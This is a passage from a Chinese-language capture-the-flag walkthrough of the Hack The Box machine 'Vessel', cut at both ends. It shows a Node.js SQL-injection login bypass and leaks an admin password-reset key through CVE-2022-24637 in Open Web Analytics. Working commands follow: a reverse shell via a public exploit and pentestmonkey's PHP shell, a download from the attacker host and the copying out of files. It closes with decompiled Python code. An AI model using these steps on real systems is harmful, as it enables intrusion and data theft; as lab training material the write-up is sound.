Again!'); res.redirect('/login'); } res.end(); }); } else { res.redirect('/login'); } }); 此处的SQL查询语句参数做了占位符处理，相当于是预编译 直接把这条语句复制到google搜索，找到如下文章，是Nodejs的SQL注入 四、Nodejs-SQL注入参考：https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/ 意思大概是说，当构造传参payload为username=admin&amp;password[password]=1时，由于Nodejs本身的特性，会将password[password]=1解析成一个对象，而不是解析成字符串，从而sql查询语句会变成如下 SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1 从而使username为admin，而password逻辑判断恒为1（布尔true），以此达到类似万能密码的效果。 开始操作 点击主页面右上角Login进入登录页面，随便输入用户名密码，同时Burp抓包 修改请求包数据部分为username=admin&amp;password[password]=1 连续点击两次Forward，回到浏览器，可看到以admin身份登录成功 查看页面源代码，发现如下子域名 将子域名写入本地hosts文件 echo \"10.10.11.178 openwebanalytics.vessel.htb\" &gt;&gt; /etc/hosts 浏览器打开openwebanalytics.vessel.htb 登录框上下都写着Open Web Analytics，那就去google一下Open Web Analytics exploit，看到了这篇文章 From Single/Double Quote Confusion To RCE(CVE-2022-24637)：https://devel0pment.de/?p=2494 五、CVE-2022-24637 如图，文章开头介绍了这个CVE的两个漏洞点： 定义PHP缓存文件头的地方，如果用'&lt;?php\\n...'，而不是\"&lt;?php\\n...\"，会导致\\n不会被解析成换行符，那么&lt;?php\\n就不是一个有效的PHP文件头，所在的缓存文件就不会被解析成PHP代码，只会被解析成普通文本，从而导致缓存信息泄露。泄露的信息还可被用于重置管理员密码。 PHP文件写入，但需要管理员权限。通过构造POST请求更改日志路径和日志等级，将日志文件设置为PHP文件。通过同时提高日志级别并使用攻击者控制的数据生成事件，可以将 PHP 代码注入到该日志文件中。这导致可以执行任意PHP代码。 自己本地用php -a测试一下 php &gt; echo '&lt;?php\\n/*wa0er*/\\n?&gt;'; &lt;?php\\n/*wa0er*/\\n?&gt; php &gt; echo \"&lt;?php\\n/*wa0er*/\\n?&gt;\"; &lt;?php /*wa0er*/ ?&gt; 如上结果可以看出单双引号解析的差异 ┌──(root💀kali)-[~/Desktop] └─# cat test1.php &lt;?php\\necho 9898;\\n?&gt; ┌──(root💀kali)-[~/Desktop] └─# php -f test1.php &lt;?php\\necho 9898;\\n?&gt; ┌──(root💀kali)-[~/Desktop] └─# cat test2.php &lt;?php echo 9898; ?&gt; ┌──(root💀kali)-[~/Desktop] └─# php -f test2.php 9898 如上结果可以看出两种格式在文件中解析效果 漏洞所在源码： https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/1.7.3/modules/base/classes/fileCache.php 关键代码如下 ... class owa_fileCache extends owa_cache { ... var $cache_file_header = '&lt;?php\\n/*'; var $cache_file_footer = '*/\\n?&gt;'; ... function putItemToCacheStore($collection, $id) { ... $data = $this-&gt;cache_file_header.base64_encode(serialize($this-&gt;cache[$collection][$id])).$this-&gt;cache_file_footer; ... $tcf_handle = @fopen($temp_cache_file, 'w'); ... fputs($tcf_handle, $data); ... 此处用的就是单引号，得到的缓存文件中的缓存数据格式如下 &lt;?php\\n/*先序列化然后base64编码的数据*/\\n?&gt; 缓存文件名命名如下 ... $cache_file = $collection_dir.$id.'.php'; ... if (!@ rename($temp_cache_file, $cache_file)) { ... 审计发现，默认id值为1，缓存文件拼接后的访问路径为（审计着重关注fileCache.php、cache.php、owa_coreAPI.php、owa_entity.php、user.php） http://localhost/owa_web/owa-data/caches/1/owa_user/xxx.php “http://localhost/owa_web/”表示owa主页面所在路径，此处为http://openwebanalytics.vessel.htb/ php文件名“xxx”表示“id+id值”的32位md5值，比如id=1，那么xxx为“id1”的md5值 在openwebanalytics.vessel.htb点击忘记密码，进入重置密码页面，刚才在git日志看到邮箱格式，尝试ethan@vessel.htb不存在，尝试admin@vessel.htb 提示发送邮件到admin@vessel.htb 然后根据刚才的分析，id1的md5值如图 缓存文件的访问路径如下 http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php 浏览器访问缓存文件，页面空白，查看页面源代码，获取到泄露的base64数据 &lt;?php\\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJDk1MUhISkY0b0RqWmR6MGJTSWcxYnV1R2ZEYUwxVHpvcGt6d2U2SmRBZnZjU0hoLzd3WHNTIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjNjNmZWQzOGU1OWIyNmU2OGY1YjJjZDc4ZWJkNmJlNSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\\n?&gt; Base64解码得序列化数据 O:8:\"owa_user\":5:{s:4:\"name\";s:9:\"base.user\";s:10:\"properties\";a:10:{s:2:\"id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:1:\"1\";s:9:\"data_type\";s:6:\"SERIAL\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:7:\"user_id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:1;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:8:\"password\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:60:\"$2y$10$951HHJF4oDjZdz0bSIg1buuGfDaL1Tzopkzwe6JdAfvcSHh/7wXsS\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:4:\"role\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:9:\"real_name\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:13:\"default admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:13:\"email_address\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:16:\"admin@vessel.htb\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:12:\"temp_passkey\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:32:\"c63fed38e59b26e68f5b2cd78ebd6be5\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:13:\"creation_date\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:10:\"1650211659\";s:9:\"data_type\";s:6:\"BIGINT\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:16:\"last_update_date\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:10:\"1650211659\";s:9:\"data_type\";s:6:\"BIGINT\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:7:\"api_key\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";s:7:\"api_key\";s:5:\"value\";s:32:\"a390cc0247ecada9a2b8d2338b9ca6d2\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}}s:16:\"_tableProperties\";a:4:{s:5:\"alias\";s:4:\"user\";s:4:\"name\";s:8:\"owa_user\";s:9:\"cacheable\";b:1;s:23:\"cache_expiration_period\";i:604800;}s:12:\"wasPersisted\";b:1;s:5:\"cache\";N;} 关键点在于temp_passkey的值c63fed38e59b26e68f5b2cd78ebd6be5可用来重置admin的密码 那么我们把URL末尾owa_do的值改为base.usersChangePassword，访问 http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword 直接修改密码，然后点击Save Your New Password，会提示Error! Can't find your temporary passkey in the db. 一般思路应该是有个名字类似temp_passkey的参数，可以修改为我们刚才获得的temp_passkey值，以此来绕过修改密码时所需的认证步骤。 然后我们就在F12页面源码看到了如下图内容 我们把hidden删除，可看到显示除了如下文本框 输入新密码，然后输入刚才temp_passkey的值，点击Save Your New Password，成功修改（这里试了好几次，可能temp_passkey刷新比较快） 用admin用户和刚修改的密码登录，登录成功 已是admin用户，那就尝试用上面文章漏洞利用的第二阶段，进一步执行命令反弹shell，下载下面的exploit脚本到本地 git clone https://github.com/hupe1980/CVE-2022-24637 先开启nc监听 nc -lvnp 9898 用如下命令执行脚本 python3 exploit.py -u admin -p wa0er http://openwebanalytics.vessel.htb/ 10.10.16.7 9898 如图成功获取www-data用户shell，但这个shell环境不稳定，换一个交互shell 下载如下脚本到本地 wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz 修改ip和port为本地ip和端口 本地开启http服务 python3 -m http.server 80 在靶机www-data用户的shell环境，从本地下载php-reverse-shell.php到/var/www/html/owa/owa-data/logs目录下 wget http://10.10.16.7/php-reverse-shell.php 再次本地开启nc监听9898端口，然后本地运行如下命令触发反弹shell文件 curl http://openwebanalytics.vessel.htb/owa-data/logs/php-reverse-shell.php home目录下有两个用户，ethan和steven，进入/home/ethan目录没权限，于是进/home/steven目录 在/home/steven目录下有一个passwordGenerator文件，在/home/steven/.notes有两个可疑文件：notes.pdf和screenshot.png 把文件都复制到/var/www/html/owa/owa-data/logs/目录下，便于访问下载 cp notes.pdf /var/www/html/owa/owa-data/logs/ cp screenshot.png /var/www/html/owa/owa-data/logs/ cp passwordGenerator /var/www/html/owa/owa-data/logs/ 回到本地，将三个文件下载下来 wget http://openwebanalytics.vessel.htb/owa-data/logs/notes.pdf wget http://openwebanalytics.vessel.htb/owa-data/logs/screenshot.png wget http://openwebanalytics.vessel.htb/owa-data/logs/passwordGenerator notes.pdf打开需要密码，screenshot.png如下，密码长度32位，这应该是passwordGenerator的运行界面 执行如下命令，看到passwordGenerator是Windows下的可执行文件，PE32表示Portable Executable 32-bit ┌──(root💀kali)-[~/Desktop] └─# file passwordGenerator passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows 把passwordGenerator拖到Windows机器中，后缀加上.exe，双击运行，如下左侧可选择password长度，右侧有三个选项ALL Characters、Alphabetic(字母)、Alphanumeric(字母数字)，前面拿到的截图是第一个选项 点击Generate!，弹窗提示生成passwords前要更改默认values，看来是生成不了，得曲线救国，破解它 六、Python反编译在Windows用WinHex（其他16进制文本编辑器均可）打开这个可执行程序，在末尾可以发现pyinstaller编译的标志MEI python反编译参考：https://blog.51cto.com/u_15060540/3888913 下载pyinstxtractor脚本 git clone https://github.com/extremecoders-re/pyinstxtractor 把passwordGenerator放到下好的脚本同目录下，运行如下命令 ┌──(root💀kali)-[~/Desktop/pyinstxtractor] └─# python3 pyinstxtractor.py passwordGenerator [+] Processing passwordGenerator [+] Pyinstaller version: 2.1+ [+] Python version: 3.7 [+] Length of package: 34300131 bytes [+] Found 95 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_subprocess.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: pyi_rth_pyside2.pyc [+] Possible entry point: passwordGenerator.pyc [!] Warning: This script is running in a different Python version than the one used to build the executable. [!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling [!] Skipping pyz extraction [+] Successfully extracted pyinstaller archive: passwordGenerator You can now use a python decompiler on the pyc files within the extracted directory 会在当前文件夹自动生成名叫passwordGenerator_extracted的目录 用uncompyle6反编译目标.pyc文件 pip install uncompyle6 uncompyle6 passwordGenerator.pyc 得到源码 # uncompyle6 version 3.9.0 # Python bytecode version base 3.7.0 (3394) # Decompiled from: Python 3.9.1+ (default, Feb 5 2021, 13:46:56) # [GCC 10.2.1 20210110] # Embedded file name: passwordGenerator.py from PySide2.QtCore import * from PySide2.QtGui import * from PySide2.QtWidgets import * from PySide2 import QtWidgets import pyperclip class Ui_MainWindow(object): def setupUi(self, MainWindow): if not MainWindow.objectName(): MainWindow.setObjectName('MainWindow') MainWindow.resize(560, 408) self.centralwidget = QWidget(MainWindow) self.centralwidget.setObjectName('centralwidget') self.title = QTextBrowser(self.centralwidget) self.title.setObjectName('title') self.title.setGeometry(QRect(80, 10, 411, 51)) self.textBrowser_2 = QTextBrowser(self.centralwidget) self.textBrowser_2.setObjectName('textBrowser_2') self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41)) self.generate = QPushButton(self.centralwidget) self.generate.setObjectName('generate') self.generate.setGeometry(QRect(140, 330, 261, 51)) self.PasswordLength = QSpinBox(self.centralwidget) self.PasswordLength.setObjectName('PasswordLength') self.PasswordLength.setGeometry(QRect(30, 130, 101, 21)) self.PasswordLength.setMinimum(10) self.PasswordLength.setMaximum(40) self.copyButton = QPushButton(self.centralwidget) self.copyButton.setObjectName('copyButton') self.copyButton.setGeometry(QRect(460, 260, 71, 61)) self.textBrowser_4 = QTextBrowser(self.centralwidget) self.textBrowser_4.setObjectName('textBrowser_4') self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41)) self.checkBox = QCheckBox(self.centralwidget) self.checkBox.setObjectName('checkBox') self.checkBox.setGeometry(QRect(250, 220, 16, 17)) self.checkBox.setCheckable(True) self.checkBox.setChecked(False) self.checkBox.setTristate(False) self.comboBox = QComboBox(self.centralwidget) self.comboBox.addItem('') self.comboBox.addItem('') self.comboBox.addItem('') self.comboBox.setObjectName('comboBox') self.comboBox.setGeometry(QRect(350, 130, 161, 21)) self.textBrowser_5 = QTextBrowser(self.centralwidget) self.textBrowser_5.setObjectName('textBrowser_5') self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41)) self.password_field = QLineEdit(self.centralwidget) self.password_field.setObjectName('password_field') self.password_field.setGeometry(QRect(100, 260, 351, 61)) MainWindow.setCentralWidget(self.centralwidget) self.statusbar = QStatusBar(MainWindow) self.statusbar.setObjectName('statusbar') MainWindow.setStatusBar(self.statusbar) self.retranslateUi(MainWindow) QMetaObject.connectSlotsByName(MainWindow) def retranslateUi(self, MainWindow): MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None)) self.title.setDocumentTitle('') self.title.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:20pt;\"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.textBrowser_2.setDocumentTitle('') self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:14pt;\"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None)) self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None)) self.textBrowser_4.setDocumentTitle('') self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:14pt;\"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.checkBox.setText('') self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None)) self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None)) self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None)) self.textBrowser_5.setDocumentTitle('') self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:16pt;\"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.password_field.setText('') class MainWindow(QMainWindow, Ui_MainWindow): def __init__(self): super(MainWindow, self).__init__() self.setupUi(self) self.setFixedSize(QSize(550, 400)) self.setWindowTitle('Secure Password Generator') self.password_field.setReadOnly(True) self.passlen() self.chars() self.hide() self.gen() def passlen(self): self.PasswordLength.valueChanged.connect(self.lenpass) def lenpass(self, l): global value value = l def chars(self): self.comboBox.currentIndexChanged.connect(self.charss) def charss(self, i): global index index = i def hide(self): self.checkBox.stateChanged.connect(self.status) def status(self, s): global status status = s == Qt.Checked def copy(self): self.copyButton.clicked.connect(self.copied) def copied(self): pyperclip.copy(self.password_field.text()) def gen(self): self.generate.clicked.connect(self.genButton) def genButton(self): try: hide = status if hide: self.password_field.setEchoMode(QLineEdit.Password) else: self.password_field.setEchoMode(QLineEdit.Normal) password = self.genPassword() self.password_field.setText(password) except: msg = QMessageBox() msg.setWindowTitle('Warning') msg.setText('Change the default values before generating passwords!') x = msg.exec_() self.copy() def genPassword(self): length = value char = index if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle('Error') msg.setText('Error while generating password!, Send a message to the Author!') x = msg.exec_() return password if __name__ == '__main__': app = QtWidgets.QApplication() mainwindow = MainWindow() mainwindow.show() app.exec_() # okay decompiling passwordGenerator.pyc 关键代码是下面的生成密码函数 def genPassword(self): length = value char = index if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx 